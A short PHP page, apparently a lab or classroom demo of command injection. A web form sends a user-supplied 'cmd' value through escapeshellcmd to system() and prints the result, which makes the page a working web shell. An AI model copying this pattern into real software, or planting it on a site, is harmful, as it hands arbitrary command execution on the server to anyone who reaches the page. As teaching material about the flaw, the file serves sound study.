<?php
	if($_SERVER["REQUEST_METHOD"] === 'POST'):

		// COMMAND INJECTION
		//$cmd = $_POST["cmd"];
		$cmd = escapeshellcmd($_POST["cmd"]);
		// COMMAND INJECTION


		echo "<pre>";
			$comando = system($cmd, $retorno);
		echo "</pre>";
	endif;

?>

<form method="post">
	
	<input type="text" name="cmd">
	<button type="submit">Enviar</button>
</form>